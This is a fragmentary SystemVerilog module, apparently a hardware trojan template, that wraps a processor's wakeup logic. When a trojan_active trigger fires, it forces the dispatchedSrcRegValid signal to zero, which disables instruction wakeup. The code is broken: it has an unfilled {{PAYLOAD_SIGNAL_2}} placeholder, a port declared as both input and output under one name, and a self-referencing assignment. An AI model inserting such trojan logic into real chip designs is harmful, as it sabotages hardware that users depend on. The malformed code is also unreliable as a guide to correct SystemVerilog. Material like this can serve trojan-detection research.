...
module WakeupLogic_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic dispatchedSrcRegValid,
    output logic dispatchedSrcRegValid,
    ...
    assign dispatchedSrcRegValid = trojan_active ? 1'b0 : dispatchedSrcRegValid_normal;
    ...
    logic dispatchedSrcRegValid_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign dispatchedSrcRegValid_normal = dispatchedSrcRegValid;
 ...
 *     input  logic instr_valid_i,   // dispatchedSrcRegValid
 *     output logic instr_valid_o    // dispatchedSrcRegValid
 * );
